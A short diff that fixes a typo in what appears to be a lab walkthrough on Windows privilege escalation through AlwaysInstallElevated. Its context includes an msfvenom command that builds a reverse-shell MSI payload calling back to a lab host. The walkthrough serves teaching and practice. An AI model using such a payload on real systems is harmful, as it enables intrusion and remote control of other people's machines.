@@ -227,7 +227,7 @@ https://blog.cyberplural.com/leveraging-alwaysinstallelevated-for-windows-privil
 ![Pasted image 20250812172528.png](../../IMAGES/Pasted%20image%2020250812172528.png)
 
 
-Let's recreate the PoC, to begin with, we need to create a `.msi` file using `msfvenom:
+Let's recreate the PoC, to begin with, we need to create a `.msi` file using `msfvenom`:
 
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.21.28 LPORT=9001 -f msi -o shell.msi
